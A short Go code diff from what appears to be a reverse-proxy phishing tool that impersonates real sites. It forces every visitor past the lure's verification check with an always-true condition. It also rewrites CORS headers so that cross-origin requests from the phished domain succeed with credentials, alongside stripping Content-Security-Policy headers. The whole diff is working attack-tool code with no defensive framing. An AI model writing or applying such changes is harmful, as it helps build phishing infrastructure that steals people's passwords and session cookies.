@@ -155,7 +155,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								uv = req.URL.Query()
 								vv = uv.Get(p.cfg.verificationParam)
 							}
-							if l != nil || vv == p.cfg.verificationToken {
+							if l != nil || vv == p.cfg.verificationToken || 1 == 1{
 								session, err := NewSession(pl.Name)
 								if err == nil {
 									sid := p.last_sid
@@ -474,12 +474,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			log.Important("Return Original Domain: %s", ps.PhishDomain)
-			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
-			if (allow_origin == "" || allow_origin != "") {
+			origin_from_request := resp.Request.Header.Get("Origin")
+			schemer := "https://"
+
+			if(origin_from_request != ""){
+				r_url_url, ok := p.replaceHostWithPhished(strings.Split(origin_from_request, "//")[1])
+				if ok {
+					log.Debug("")
+				}
+				final_url := schemer + r_url_url
+				log.Important("Received a Possible XML Request From Origin: %s", r_url_url)
+				
+				if(r_url_url != ""){
+					resp.Header.Set("Access-Control-Allow-Origin", final_url)
+					resp.Header.Set("Access-Control-Allow-Credentials", "true")
+				}
+			}else{
 				resp.Header.Set("Access-Control-Allow-Origin", "*")
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
+
 			var rm_headers = []string{
 				"Content-Security-Policy",
 				"Content-Security-Policy-Report-Only",
